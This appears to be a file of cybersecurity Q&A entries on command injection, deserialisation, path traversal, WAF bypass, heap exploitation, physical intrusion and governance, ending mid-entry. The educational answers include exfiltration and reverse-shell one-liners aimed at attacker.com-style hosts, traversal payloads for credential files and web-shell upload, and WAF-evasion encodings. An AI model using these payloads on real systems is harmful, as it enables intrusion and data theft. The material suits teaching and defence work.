p("What is a command injection vulnerability?",
  "Command injection: attacker injects OS commands into application; executed by server with application privileges. How it works: application passes user input to shell command without sanitisation; ping.php?host=192.168.1.1 calls: system(ping -c 1 host_input); attacker submits: host=192.168.1.1; cat /etc/passwd; semicolon separates commands; server executes ping AND cat /etc/passwd; output returned. Injection operators: ; semicolon (execute sequentially); && AND (execute second if first succeeds); || OR (execute second if first fails); | pipe (pipe output to next command); newline character; backtick (old-style command substitution); $() command substitution; all serve as command separators or injection points. Out-of-band injection: no output in response; use DNS or HTTP callback: host=192.168.1.1 && curl http://attacker.com/$(whoami); or DNS: nslookup $(id | base64).attacker.com; response to attacker server. Blind timing: host=192.168.1.1 && sleep 5; if response delayed 5 seconds: command injection confirmed; no output needed. Context: command injection inside quoted string: command ping -c 1 HOST; if HOST = x -c 10 y: becomes ping -c 1 x -c 10 y; argument injection not command injection (limited impact but adds flags); test: inject quotes, semicolons, pipes. Exploitation: from command injection to full shell: spawn reverse shell: host=x; bash -i >& /dev/tcp/attacker/4444 0>&1; or: host=x; python3 -c import pty;pty.spawn(/bin/sh); upgrade to full TTY. Mitigation: never pass user input to shell; use language APIs that do not invoke shell: subprocess without shell=True (Python): subprocess.run([ping, -c, 1, host_input], shell=False); host_input is single argument, not parsed by shell; parameterise at library level; Java: ProcessBuilder without shell invocation; PHP: avoid exec, system, shell_exec, passthru with user input; if OS command unavoidable: allowlist validation (only [a-z0-9.] in hostname); reject anything else; escapeshellarg() and escapeshellcmd() exist but easily bypassed -- prefer allowlist over escaping.")

p("What is insecure deserialisation and what languages are affected?",
  "Insecure deserialisation: converting untrusted data into objects without proper validation; allows attackers to tamper with object state or trigger code execution. Affected languages: Java: ObjectInputStream.readObject() with native serialisation (AC ED magic bytes); Python: pickle.loads(), yaml.load() without Loader, shelve; PHP: unserialize() with magic methods; Ruby: Marshal.load(); .NET: BinaryFormatter, SoapFormatter, DataContractSerializer with TypeNameHandling.All; JavaScript/Node.js: node-serialize, kryo (if misconfigured). Java: most historically exploited; gadget chains: ysoserial tool generates exploit payloads for: CommonsCollections, Spring Framework, JDK, Hibernate, MyFaces; vulnerable when: untrusted Java serialised bytes deserialized; attacker knows or guesses classpath libraries; entry points: Java RMI (Remote Method Invocation), JMX, HTTP endpoints accepting serialised objects (application/x-java-serialized-object Content-Type), JMS queues, AMF (Flash remoting), Kryo, XStream (XML). Detection: look for AC ED 00 05 bytes (Java serialisation magic); base64 encoded: rO0AB (AC ED in base64); Content-Type: application/x-java-serialized-object; endpoints accepting serialised objects. PHP: magic methods exploited: __wakeup() called on deserialise; __destruct() called when garbage collected; __toString() called when object used as string; POP chain (Property Oriented Programming): link objects via magic methods to reach file_put_contents, eval, exec. Python pickle: pickle.loads() is RCE if attacker controls data: any object with __reduce__ method returns arbitrary callable; immediately exploit. Prevention: never deserialise untrusted data; use safer formats (JSON, Protocol Buffers, MessagePack) without code execution; if Java serialisation unavoidable: implement ObjectInputFilter (Java 9+) to allowlist permitted classes; sign and verify serialised data integrity (HMAC); monitor for deserialisation class loading events (Java security manager); isolation: run deserialisation in sandboxed process with minimal permissions.")

p("How do you perform physical penetration testing?",
  "Physical penetration testing: assess physical security controls; test whether physical access barriers protect sensitive areas. Scope: define clear rules of engagement; signed authorisation letter from appropriate authority (carry at all times); what areas are in scope (data centre, server room, offices); what techniques are authorised (tailgating, lock picking, RFID cloning, dumpster diving); emergency contact if apprehended. Techniques: tailgating/piggybacking: wait for employee to badge through; follow them without badging; social obligation to hold door; counter-test: do employees challenge tailgaters?; pretexting: pose as maintenance, IT support, delivery person, auditor, vendor; research company beforehand (LinkedIn, website); prepare appropriate props (uniform, clipboard, equipment, business cards); RFID cloning: capture proximity card signal with reader (Proxmark3, Chameleon); clone to blank card; replicate at distance (extended range reader up to 1 metre); clone badge from conference, lobby, or close proximity; lockpicking and bypassing: physical lock picking (bump keys, pick tools); bypass locks (credit card shimming, under-door tools, loidle); padlock bypass; window bypass; cable management to reach locked doors; dumpster diving: search discarded materials (documents, hardware, credentials, organisation structure); shredding policy assessment; camera assessment: identify CCTV coverage gaps; test if cameras monitored live vs recorded; social engineering reception: test if visitors verified and escorted; can you claim appointment with executive and get access?. Tools: Proxmark3 (RFID cloning); lock picks and bump keys; Flipper Zero (multi-purpose: RFID, NFC, IR, radio); under-door tool; request tool (thin tool to pull door handle on other side); camera assessment with video. Deliverables: narrative of what was achieved (entered server room, accessed unattended workstation, captured RFID badges); photographic evidence; gap analysis vs security policy; risk-rated findings; remediation: receptionist training, lock upgrade, tailgating detection, badge access logging and alerting, clean desk policy enforcement. Legal: strict scope; authorisation letter names and photos if possible; immediately identify to police if apprehended (do not claim innocence -- show authorisation letter); do not enter areas explicitly excluded from scope.")

p("What is a race condition vulnerability in web applications?",
  "Race condition (TOCTOU -- Time of Check to Time of Use): concurrent requests processed in unexpected order; both pass single-use check before either registers result. How it works: single-use coupon: user sends 10 simultaneous requests to redeem coupon; server checks if coupon used (all 10 check before any marks as used -- all return valid); server attempts to apply all 10 (first one marks used; 9 more already passed check); coupon applied 10 times. Check-then-act window: 1. Check: read balance = $100; 2. Act: withdraw $100; if two concurrent withdrawals: both check sees $100; both proceed; result: -$100 balance. Examples: coupon and promo code reuse; gift card balance exhaustion; duplicate payment processing; concurrent API key generation (same key generated); account creation with same email (race between uniqueness check and insert); limited edition stock over-allocation (check quantity > 0, then decrement). Detection and testing: Burp Turbo Intruder: send many requests simultaneously; single-packet attack (HTTP/2 allows multiple requests in single TCP packet -- synchronises server receipt); Race condition test: for (coupon, gift card, transfer) endpoints: send 10-50 simultaneous requests with same token/coupon. Turbo Intruder single-packet technique: group requests together; send all in one TCP segment using HTTP/2 multiplexing or HTTP/1.1 pipeline; removes network jitter from timing; requests arrive simultaneously at server. Exploitation impact: financial: double-spend, coupon reuse, balance overdraft; inventory: order more than available; authentication: bypass rate limiting (many simultaneous login attempts hit before lockout counter updates); TOCTOU on file operations: check file existence, then open; attacker replaces symlink between check and open. Mitigation: atomic database operations: UPDATE coupons SET used=1 WHERE code=X AND used=0 RETURNING id (check and update in single atomic operation; row count 0 = already used); database transactions with appropriate isolation level (SERIALIZABLE prevents race conditions but impacts performance); distributed locks (Redis SETNX for mutual exclusion; lock before critical section; release after); idempotency keys: unique key per operation; duplicate key = duplicate rejection (even if processed twice, effect applied once).")

p("What is path traversal and directory traversal?",
  "Path traversal (directory traversal): attacker manipulates file paths to access files outside intended directory; read /etc/passwd, source code, credentials, or overwrite files. How it works: application uses user input to construct file path: readFile(base_dir + user_input); user_input = ../../etc/passwd; concatenated path = /var/www/html/../../etc/passwd = /etc/passwd; ../ navigates up one directory level. Variants: basic: ../../../etc/passwd; URL encoded: %2e%2e%2f (../); double encoded: %252e%252e%252f (double URL encoding: server decodes once before validation, decodes again when accessing); null byte: ../../../../etc/passwd%00.jpg (add .jpg to bypass extension check; null byte terminates string in C -- file opened as /etc/passwd); Windows: ..\ backslash; ..\\..\\..\\ (backslash + forward slash mix); unicode: %c0%ae%c0%ae%c0%af (UTF-8 overlong encoding of ../ -- old Java/Tomcat bypass); UNC path injection (Windows): \\attacker\share. What you can read: /etc/passwd (user list); /etc/shadow (password hashes if root); /etc/hosts (internal network map); ~/.ssh/id_rsa (SSH private key); web application source code (config files with DB credentials, API keys); /proc/self/environ (environment variables -- may contain secrets); /proc/net/tcp (network connections); Windows: C:\\Windows\\System32\\drivers\\etc\\hosts; C:\\inetpub\\wwwroot\\web.config (IIS config with connection strings); C:\\Users\\Administrator\\.ssh\\id_rsa. Testing: inject ../ in all file-related parameters: filename=, file=, path=, template=, include=, page=; URL parameters, form fields, cookies, HTTP headers; for every file serve endpoint; test all encoding variants. File upload with traversal: filename=../../config.php (overwrite config); filename=../../../var/www/html/shell.php (write web shell). Mitigation: resolve absolute path before check: Python: os.path.realpath(user_path) then check if starts with base_dir; never trust user-supplied paths; use whitelist of allowed filenames or IDs (not paths); chroot jail: confine application to specific directory (cannot access files outside jail even with traversal).")

p("What is SQL injection prevention in code?",
  "SQL injection prevention: write code that cannot execute injected SQL. Parameterised queries (prepared statements): most important mitigation; separate SQL structure from data; database treats parameter values as data not SQL code. Python with parameterised queries: cursor.execute(SELECT * FROM users WHERE username = %s AND password_hash = %s, (username, password_hash)); the %s placeholders are parameters; database handles escaping; cannot inject SQL via parameters. Java PreparedStatement: PreparedStatement stmt = conn.prepareStatement(SELECT * FROM users WHERE id = ?); stmt.setInt(1, userId); ResultSet rs = stmt.executeQuery(); PHP PDO: $stmt = $pdo->prepare(SELECT * FROM users WHERE id = ?); $stmt->execute([$userId]); Node.js (mysql2): connection.execute(SELECT * FROM users WHERE id = ?, [userId], callback); wrong (vulnerable): cursor.execute(SELECT * FROM users WHERE id= + userId) -- string concatenation. Stored procedures (if parameterised): call stored procedure with parameters: CALL GetUser(?); with parameterised user_id; procedure body uses parameters without dynamic SQL (see stored procedure SSTI entry). ORM (Object-Relational Mapping): SQLAlchemy (Python): User.query.filter_by(username=username) -- generates parameterised query automatically; Django ORM: User.objects.filter(username=username) -- parameterised; Hibernate (Java): session.createQuery(FROM User WHERE username = :username).setParameter(username, username) -- parameterised; raw SQL in ORM: use ORM parameterisation even for raw: session.execute(text(SELECT * FROM users WHERE id = :id), {id: userId}) -- parameterised raw SQL. Allowlist input validation: validate and restrict input to known-good characters; username: only alphanumeric and underscore; reject anything else; does not replace parameterised queries (defence in depth). Least privilege database user: application database user: SELECT, INSERT, UPDATE, DELETE only; no DROP, CREATE, xp_cmdshell, FILE; limits damage from SQLi even if parameterisation fails. Error handling: catch SQL exceptions; return generic error to user (never database error message with query structure); log internally. WAF: last resort defence; not reliable SQLi prevention; easily bypassed; proper parameterisation is the fix. Testing: with automated tools (sqlmap) and manual injection of: single quote, double quote, boolean conditions, UNION SELECT, time delays; verify both successful and unsuccessful injection attempts are handled correctly.")

p("What is the principle of defence in depth?",
  "Defence in depth: multiple layered security controls; no single point of failure defeats all defences; attacker must overcome multiple independent barriers; based on military strategy. Layers: Network perimeter: firewall, IPS/IDS, DDoS mitigation, edge WAF; filters obviously malicious traffic before reaching application. Network segmentation: VLANs, micro-segmentation; limits blast radius if perimeter breached; attacker cannot move freely even inside network. Endpoint security: antivirus, EDR, application whitelisting; detects and blocks malware on endpoint; catches threats that bypass network controls. Application security: input validation, output encoding, parameterised queries, CSRF protection, authentication, authorisation; protects at application layer. Authentication: MFA, strong passwords, account lockout, session management; makes credential-based attacks harder even if password compromised. Authorisation: RBAC, least privilege; limits what authenticated attacker can access. Encryption: TLS in transit, at-rest encryption; protects data even if other layers breached. Monitoring and detection: SIEM, EDR alerts, anomaly detection; detects breaches in progress. Incident response: containment, eradication, recovery; limits damage duration. User awareness: phishing awareness training; last human line of defence. Why each layer matters: AV missed fileless malware (network detection catches beaconing); WAF blocked SQLi in one parameter but SSTI via another (proper coding prevents); MFA prevented password breach account takeover; network segmentation stopped ransomware spreading from finance to R&D. Real world example: attacker sends phishing email: User awareness training: 80% do not click; Email gateway: blocks 15% with attachment scanning; EDR: detects macro execution in 4%; Network monitoring: detects C2 beaconing in remaining; Response: contains and remediates before attacker reaches critical data. All controls working together reduce risk to acceptable level even though individually each can be bypassed by sufficiently motivated attacker. Failure mode: single control failure does not cause compromise; cost for attacker increases with each layer; determines economic viability of attack.")

p("What is security governance and risk management?",
  "Security governance: leadership, processes, and structures ensuring security is aligned with business objectives and managed effectively. Components: Policies: high-level statements of security intent (Acceptable Use Policy, Information Security Policy, Remote Access Policy); approved by executive or board; mandatory compliance; reviewed annually. Standards: specific requirements implementing policy (password must be 12+ characters, MFA required for remote access); more technical than policy; referenced in policies. Procedures: step-by-step instructions for implementing standards (how to set up MFA, how to create user account); operational level. Guidelines: recommended practices (not mandatory); helpful context. Roles: CISO (Chief Information Security Officer): security strategy, executive reporting, risk ownership; Security team: technical implementation; Data owners: business leaders responsible for specific data; IT/DevOps: implement controls designed by security; Internal audit: independent assurance that controls working. Risk management: NIST Risk Management Framework (RMF): categorise, select controls, implement, assess, authorise, monitor; ISO 27005: information security risk management standard; Risk = Likelihood x Impact: qualitative (High/Medium/Low) or quantitative (annual expected loss); Risk treatment: avoid (eliminate the risk), transfer (cyber insurance), mitigate (implement controls), accept (residual risk below threshold). Risk register: central record of all identified risks; risk owner, inherent risk rating, controls, residual risk rating, treatment plan, review date; reviewed quarterly or after significant changes. KPIs and KRIs: KPI (Key Performance Indicator): how well are controls working? (% assets patched within SLA, % staff completed training, time to close vulnerabilities); KRI (Key Risk Indicator): early warning of increasing risk (# failed access attempts trend, # unpatched critical vulnerabilities, # unreviewed access rights). Board reporting: quarterly or semi-annual security report to board; business language (not technical); risk posture vs risk appetite; cyber insurance coverage review; regulatory compliance status; significant incidents and lessons learned; security investment ROI.")

p("What is cloud-native security monitoring?",
  "Cloud-native security monitoring: monitoring cloud infrastructure and workloads using cloud-native tools and approaches. AWS native: GuardDuty: threat detection service analysing CloudTrail, VPC Flow Logs, DNS query logs; findings: compromised EC2 (connecting to known C2), unusual API calls (credential exfiltration), crypto mining (unusual compute patterns), reconnaissance (port scanning from EC2), data exfiltration (S3 access from unusual IP); enable in all regions; findings to Security Hub. CloudTrail: logs all AWS API calls (who called what API from which IP at what time); critical: data events (S3 GetObject, DynamoDB GetItem) can be enabled separately; management events enabled by default; CloudWatch Logs integration; analyse with Athena (SQL queries over CloudTrail S3 logs). Config: compliance checking; Config rules check resources against expected configuration; alert on non-compliant resources; configuration history (who changed what when). Security Hub: aggregates findings from GuardDuty, Inspector, Macie, Config, Firewall Manager, and third-party tools; prioritised security findings; automated remediation with EventBridge. Macie: ML-based sensitive data discovery in S3; finds PII, credentials, encryption keys; alerts on public or unencrypted buckets with sensitive data. Inspector: vulnerability scanning for EC2, ECR images, Lambda; CVE assessment; network reachability analysis. VPC Flow Logs: IP-level network telemetry; source IP, destination IP, port, protocol, bytes, action; analyse for: east-west movement, data exfiltration, port scanning, unusual protocols. EventBridge + Lambda automation: trigger Lambda on GuardDuty finding; auto-isolate EC2 (modify security group to deny all), disable compromised IAM credentials, notify SOC via SNS. Azure: Microsoft Defender for Cloud (security posture + threat protection); Microsoft Sentinel (cloud-native SIEM; queries with KQL); Defender for Identity (AD threat detection); Activity Log + Diagnostic Settings for resource logging. GCP: Security Command Center; Cloud Audit Logs; Chronicle (Google SIEM); Forseti (open-source policy-as-code); VPC Service Controls (data exfiltration prevention).")

p("What are the OWASP Top 10 for 2021?",
  "OWASP Top 10 2021: list of most critical web application security risks. A01: Broken Access Control (moved up from A05): most common finding; IDOR, privilege escalation, CORS misconfiguration, missing function-level access control; 94% of applications tested for some form of broken access control. A02: Cryptographic Failures (was Sensitive Data Exposure): weak cryptography; HTTP instead of HTTPS; weak algorithms (MD5, SHA1, DES, RC4); hardcoded keys; insufficient key lengths; missing certificate validation. A03: Injection (was A01): SQL, NoSQL, command, LDAP, OS, expression language injection; interpreter treats hostile data as commands or queries. A04: Insecure Design (new): security flaws by design rather than implementation; missing threat model; no security design review; business logic flaws; trust assumptions in design. A05: Security Misconfiguration (was A06): default credentials; unnecessary features enabled; error messages with sensitive info; missing security headers; cloud misconfiguration; XXE in XML processors. A06: Vulnerable and Outdated Components (was A09): using components with known CVEs; Log4Shell example; no SBOM or inventory; failure to patch promptly. A07: Identification and Authentication Failures (was Broken Authentication): weak passwords allowed; no MFA; session fixation; credential stuffing not prevented; insecure session management. A08: Software and Data Integrity Failures (new): code and infrastructure without integrity verification; CI/CD pipeline attacks; insecure deserialisation (previously A08 2017); auto-update without integrity check (SolarWinds type attack). A09: Security Logging and Monitoring Failures (was Insufficient Logging): login failures not logged; no alerting; logs not monitored; SIEM not in place; insufficient log detail for forensics. A10: Server-Side Request Forgery (SSRF) (new): server fetches user-specified URL; access internal services, cloud metadata, local files; increasingly common in cloud environments. OWASP methodology: data driven from real application security testing data; not theoretical; reflects what practitioners actually find; updated every 3-4 years; application: code reviews check for each category; automated scanners map to categories; pentest reports reference OWASP categories; developer training covers each category.")

p("How do you bypass WAF filtering?",
  "WAF bypass techniques: evade Web Application Firewall signature-based filtering. Encoding and obfuscation: URL encoding: single quote %27 (or %2527 double-encoded); space %20 or + or /**/ (comment as space in SQL); HTML encoding in reflected input: &lt; (if WAF checks HTML context); case variation: SeLeCt (some WAF regex case-sensitive); hexadecimal encoding in SQL: 0x61646d696e (hex for admin); SQL comments: UN/**/ION SEL/**/ECT; version-specific comments in MySQL: /*!UNION*/ SELECT. HTTP protocol manipulation: chunked Transfer-Encoding: split payload across multiple chunks (some WAFs do not reassemble); HTTP parameter pollution: param=normal&param=malicious (some frameworks take last value; WAF checks first); content-type manipulation: application/json bypass if WAF only checks application/x-www-form-urlencoded; JSON injection via body when WAF only checks URL parameters; HTTP method override: X-HTTP-Method-Override: PUT header with POST request; WAF checks method not override. Request smuggling: HTTP request smuggling to bypass WAF (WAF sees safe request; backend sees injected malicious request). Application-specific: wildcard characters: in SQL LIKE clause injection; function alternatives: MID() instead of SUBSTRING(), IF() instead of CASE WHEN, CHAR() to build strings; MySQL specific: @@version, version(); database-specific syntax; payload case: wAF might not match wHiTeLiSt; Encoding chains: double URL encode then HTML encode; application decodes twice; WAF decodes once (misses payload). IP-based: rotate source IPs (distributed attack bypasses per-IP rate limiting); IPv6 if WAF only blocks IPv4. WAF fingerprinting: send payloads known to trigger WAFs; compare responses (403 vs 200 vs redirect); identify WAF type (Cloudflare: CF-RAY header; ModSecurity: Server header; Barracuda: Barracuda header); use known bypass techniques for identified WAF. Legal and ethical: WAF bypass testing only on authorised systems; WAF bypass techniques for penetration testing to demonstrate WAF is insufficient alone; conclusion: WAF is not a fix for insecure code; proper secure coding required; WAF is additional layer, not substitute.")

p("What is heap exploitation in binary security?",
  "Heap exploitation: memory corruption vulnerabilities in dynamically allocated memory (heap); more complex than stack-based exploitation. Heap allocators: glibc malloc (ptmalloc2): Linux standard; chunk-based; bins for free chunks; metadata stored inline with chunks (prev_size, size, fd, bk pointers); tcmalloc (Google): used in Chrome; jemalloc (FreeBSD, Firefox, Rust allocator): different design. Common vulnerabilities: heap overflow: write past allocated buffer into adjacent chunk metadata or data; corrupts chunk headers or object fields; use-after-free (UAF): free chunk then continue using pointer; freed memory may be reallocated to different object; subsequent operations on stale pointer affect new object; double-free: free same pointer twice; corrupts free list; heap spray: allocate many objects at predictable addresses; increase probability of controlling key memory regions for exploit reliability. Classic glibc techniques (ptmalloc2): unlink attack: overwrite fd/bk pointers of free chunk; trigger unlink() macro during malloc consolidation; arbitrary write-what-where; House of techniques: House of Force: overwrite wilderness chunk size; control malloc to return arbitrary pointer; House of Einherjar: overwrite prev_size to trigger backward consolidation; control freed chunk address; House of Orange: craft malloc_hook overwrite; House of Lore: smallbin attack; fastbin dup: double-free in fastbin; allocate twice at same address; place object with controlled content at kernel-controlled address; tcache attacks: tcache introduced in glibc 2.26; simpler freelist; tcache poisoning: free chunk, overwrite fd pointer (only 1 step before alloc unlike fastbin 2); allocate to arbitrary address; tcache dup: double-free without mitigation check in old versions; safe-linking: glibc 2.32+ XOR encodes tcache/fastbin fd pointers with heap address; mitigates pointer corruption. Modern mitigations: ASLR: heap address randomised; heap metadata corruption harder (need to leak heap address first); canaries in metadata (glibc 2.17+): detect heap corruption; tcache counts: prevent tcache dup by checking count; safe-linking; research: heap exploitation increasingly requires chaining with info leak to get heap/libc base address before exploitation; CTF categories: pwn (binary exploitation including heap).")

p("What is endpoint security maturity and how do you measure it?",
  "Endpoint security maturity: how well endpoints are protected against threats; measured along multiple dimensions. Maturity dimensions: (1) Visibility and inventory: do you know all endpoints? Asset management database; automated discovery; CMDB accuracy; missing unmanaged endpoints = blind spots for attackers. (2) Patch management: what % of endpoints patched within SLA? SLA: critical: 7 days; high: 30 days; medium: 90 days; low: 180 days; metrics: % compliant per severity tier; time to patch; patch failure rate; exceptions management. (3) Endpoint protection: AV/EPP coverage: what % have active, updated AV? EDR coverage: what % have EDR deployed and connected? EDR sensor health: are all sensors reporting? Any gaps? (4) Configuration hardening: CIS benchmark compliance %: what % of endpoints pass CIS Level 1 checks? Key settings: encryption, screen lock, firewall, auto-update, password policy. (5) Vulnerability management: what % of critical CVEs remediated within SLA? Mean time to remediate critical vulnerabilities; vulnerability debt trend. (6) Detection capability: are you detecting threats on endpoints? Time from compromise to detection (MTTD per endpoint); % threats detected by EDR vs other sources; alert triage efficiency. (7) Response capability: how quickly do you respond and contain? Automation: can you isolate an endpoint in seconds (automated via SOAR + EDR API) or hours (manual ticket)?; remote investigation capability without physical access. Metrics framework: build dashboard: total managed endpoints; % with EDR (target: 100%); % with current patches (target: >95% critical, >90% high); % compliant with baseline (target: >85%); MTTD for endpoint threats; MTTR for endpoint compromises; track monthly and trend. Gaps commonly found: unmanaged devices (IoT, BYOD, legacy systems exempt from MDM); inconsistent EDR deployment (network segments without EDR coverage); high exception rate for patches (exceptions become permanent); EDR alerts not reviewed (alert fatigue or understaffed SOC); no automated isolation capability (slow containment).")

p("What is a phishing simulation programme?",
  "Phishing simulation programme: controlled phishing tests on own employees to measure and improve security awareness. Purpose: measure click rate baseline; identify high-risk users or departments; train through experience (more effective than annual video); track improvement over time; demonstrate ROI of security awareness programme. Platforms: KnowBe4 (market leader; template library; automated training assignment based on failure; LMS integration; PhishER for real phishing management); Proofpoint Security Awareness Training; Cofense (formerly PhishMe); Infosec IQ; Gophish (open-source; run your own); Microsoft Attack Simulator (included in Defender for O365 E5). Programme design: frequency: monthly simulations (enough to train without fatigue); variety: rotate attack types: credential harvest, malware attachment, link to fake login, vishing, smishing; difficulty: start medium; increase difficulty as organisation improves; personalisation: spearphishing simulations targeting specific departments (finance team targeted with CFO voice-from-invoice lure); timing: test at different times (Monday morning, Friday afternoon, post-holiday); departments often have different rates. Metrics: click rate: % who click link; credential submission rate: % who enter credentials; report rate: % who correctly report to IT/security; year-over-year improvement; industry benchmark comparison (typical: 30% click rate for new programme; target: <5% after 12 months). Response to failure: immediate training: show educational page immediately after clicking (not punitive -- educational); assign targeted training module based on type of attack clicked; do not discipline individuals for failing simulations (creates adversarial relationship with security team; reduces reporting). Positive reinforcement: reward reporters (small recognition); celebrate improving metrics; security champions. Ethical considerations: do not use simulation to fire employees; do not use distressing lures (health crisis, job loss, death of relative); inform HR and legal; avoid targets who have disclosed mental health concerns; balance awareness with trust. Real phishing integration: teach users to report real phishing; Cofense Reporter button; KnowBe4 PhishAlert; integration with PhishER or SOAR for automated response to reported phishing; close the loop (acknowledge user reports; tell them outcome).")

p("What is a virtual private network (VPN) and how does it work?",
  "VPN: creates encrypted tunnel between user and VPN server; hides traffic from ISP and network; appears to originate from VPN server IP. How it works: user establishes connection to VPN server; authentication (certificate, username/password, MFA); encryption negotiated (TLS or IPsec); all traffic routed through encrypted tunnel to VPN server; VPN server decrypts, forwards to destination; response returns via same tunnel. Types: Remote access VPN: individual user connects to organisation network; most common enterprise use case; protocols: SSL/TLS VPN (most common: OpenVPN, AnyConnect, GlobalProtect, Pulse Secure), IPsec VPN (IKEv2/IPsec common for mobile), WireGuard (modern, fast, simple). Site-to-site VPN: connect two office networks permanently; branch office to HQ; replaced by SD-WAN in many enterprises. Consumer VPN: privacy tool; hide browsing from ISP; appear in different geographic location; providers: NordVPN, ExpressVPN, Mullvad; not security tool for enterprises. Protocols comparison: OpenVPN: open-source; TLS-based; widely compatible; TCP or UDP; slower than WireGuard; IKEv2/IPsec: fast; mobile-friendly (reconnects quickly after network change); built into iOS, Android; enterprise-grade; WireGuard: modern; fast; simple codebase (4000 lines vs 600,000 for OpenSSL); UDP-based; increasingly popular; built into Linux kernel 5.6+; SSTP: Microsoft; HTTPS port 443; penetrates firewalls; Windows native; L2TP/IPsec: outdated; combination protocol; L2TP encapsulates, IPsec encrypts; not recommended (NSA allegedly cracked implementation). Security limitations: VPN protects network layer; does not protect against compromised endpoints, malware, phishing, or application vulnerabilities; split tunnelling: some VPNs allow non-corporate traffic to bypass VPN; risk if user accesses corporate resources after browsing malicious site (malware on endpoint uses corporate tunnel); full tunnel preferred for corporate; VPN server vulnerabilities: Pulse Secure (CVE-2019-11510 -- unauthenticated file read; actively exploited by nation-states), Citrix (CVE-2019-19781), Fortinet, GlobalProtect all had critical CVEs; patch VPN servers immediately; replace with ZTNA if possible.")

p("What is the MITRE DEFEND framework?",
  "MITRE D3FEND: knowledge graph of defensive cybersecurity techniques; complement to MITRE ATT&CK (offensive techniques); maps defensive countermeasures to specific ATT&CK techniques. Purpose: answer: what specific defences protect against specific ATT&CK techniques? Security teams use to: identify defensive gaps against specific threat actor TTPs; justify security investments (purchase of specific tool addresses specific ATT&CK technique); assess completeness of defensive posture; communicate with executives (what defence addresses what threat). Structure: Digital Artefacts: software, hardware, data objects that defenders can observe or protect; Defensive Techniques: specific defensive capabilities that protect, detect, or respond to offensive techniques; for each defensive technique: what artefacts it manipulates; what ATT&CK techniques it counters; technique categories: Harden (reduce attack surface): application hardening, credential hardening, message hardening, network hardening, platform hardening; Detect (identify threats): file analysis, identifier analysis, message analysis, network traffic analysis, platform monitoring, process analysis, user behaviour analysis; Isolate (restrict access): execution isolation, network isolation; Deceive (mislead attacker): decoy environment, decoy file, decoy network resource, decoy user credential; Evict (remove attacker): credential eviction, process eviction, execution eviction. Example mapping: Spearphishing Link (T1566.002): D3FEND countermeasures: Homoglyph Detection (detect look-alike domains), DNS Denylisting (block known phishing domains), URL Analysis (scan links), Sender Policy Framework (SPF validation), Email User Training, Inbound Traffic Filtering. Using D3FEND: ATT&CK Navigator: show attack techniques threat actor uses; D3FEND: for each technique, identify applicable defences; gap analysis: which required defences are not implemented?; present to management: here are specific ATT&CK techniques threat actor uses; here are specific defences we lack. Integration with tools: Wiz, Prisma Cloud mapping security controls to ATT&CK/D3FEND; security architecture reviews use D3FEND to verify controls address expected threats.")

p("How do you perform a red team operation planning?",
  "Red team operation planning: structured planning for realistic adversary simulation engagement. Objectives: define what intelligence-driven scenario to simulate (emulate specific threat actor targeting your industry; test detection of specific TTPs; test response to ransomware or data exfiltration scenario); measurable goals (reach domain admin without detection; exfiltrate 100MB of data without SIEM alert; maintain persistence for 30 days undetected). Rules of Engagement: out-of-scope systems (production databases with real PII -- read-only test data only; systems supporting life safety); prohibited techniques (DoS, destructive actions, social engineering of specific employees if HR has not approved); notification restrictions (who knows red team is active; purple team knows, blue team does not -- stealth test); abort conditions (if attacker path leads to real critical system; if unintended outage); data handling (discovered credentials must not be used beyond proof; found PII must be reported immediately). Threat intelligence research: identify most likely threat actors for organisation (based on industry, geography, size, public announcements); research threat actor TTPs (MITRE ATT&CK group profile, public reports from Mandiant, CrowdStrike, Recorded Future, CISA advisories); build threat actor playbook (initial access methods they use, C2 infrastructure characteristics, lateral movement tools, data staging methods). Infrastructure setup: build realistic C2 infrastructure (aged domains, categorised, CDN-fronted if appropriate; operator security -- no attribution to red team firm); prepare tooling (custom implants if required; CS malleable profiles to mimic threat actor); OPSEC for team (separate identities from pentesting; segregated infrastructure). Execution phases: pre-engagement (scope, contracts, emergency contacts); initial access (phishing campaign, vulnerability exploitation, physical access per scope); establish foothold (deploy C2, gain persistence); internal reconnaissance (AD enumeration, network mapping, identify targets); privilege escalation (to admin); lateral movement (reach target systems); objective completion (data exfiltration, detection simulation, persistence persistence); reporting. Metrics: detection rate (what % of techniques triggered SIEM alert); response time (from detection to response action); dwell time (time before detection); technique coverage (% of used techniques detected).")

p("What is a cybersecurity risk assessment?",
  "Cybersecurity risk assessment: systematic process to identify, analyse, and evaluate security risks to organisation; foundation for risk-informed security decisions. Standards: NIST SP 800-30 (Guide for Conducting Risk Assessments): framework; NIST RMF (Risk Management Framework); ISO 27005 (information security risk management); FAIR (Factor Analysis of Information Risk): quantitative framework. Types: asset-based: start with assets; identify threats and vulnerabilities for each; calculate risk; threat-based: start with threat actors and scenarios; identify which assets at risk; vulnerability-based: start with vulnerability scan; identify affected assets; calculate exposure. Process steps: (1) Prepare: define scope and objectives; identify stakeholders; select risk methodology. (2) Identify assets: information assets (data), systems (servers, endpoints, cloud), processes (business processes), people (employees, contractors); assign asset value (confidentiality, integrity, availability impact if compromised). (3) Identify threats: threat catalogue (STRIDE, MITRE ATT&CK, NIST SP 800-30 threat source tables); relevant threat actors for organisation (APT groups, cybercriminals, insiders, natural disasters); for each asset: what threats apply? (4) Identify vulnerabilities: vulnerability scans; security assessment findings; audit results; known CVEs in used software; process and policy gaps. (5) Determine likelihood: based on: threat actor capability and motivation, vulnerability exploitability, existing controls; qualitative (High/Medium/Low) or quantitative (probability estimate). (6) Determine impact: based on: asset value, consequences (financial, regulatory, reputational, operational); qualitative or quantitative (financial impact in dollars). (7) Calculate risk: risk matrix: likelihood x impact = risk level; FAIR: risk = loss event frequency x probable loss magnitude. (8) Risk treatment options: avoid, transfer (insurance), mitigate, accept; prioritise by risk level; cost-benefit analysis for mitigations. (9) Document and communicate: risk register; executive risk report; board communication. Risk appetite: maximum risk organisation willing to accept; risks above appetite require treatment; risks below appetite may be accepted; set by board and executive leadership.")

p("What is a cloud security architecture review?",
